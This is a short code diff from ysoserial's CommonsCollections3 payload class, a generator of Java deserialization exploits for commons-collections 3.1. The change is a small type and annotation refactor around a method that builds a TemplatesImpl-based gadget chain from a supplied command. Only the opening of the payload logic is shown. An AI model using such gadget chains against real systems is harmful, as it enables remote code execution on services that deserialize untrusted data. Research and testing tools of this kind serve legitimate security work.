@@ -17,19 +17,18 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 
 /*
  * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
  * InvokerTransformer.
  */
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(command);
+		Object templatesImpl = Gadgets.createTemplatesImpl(command);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
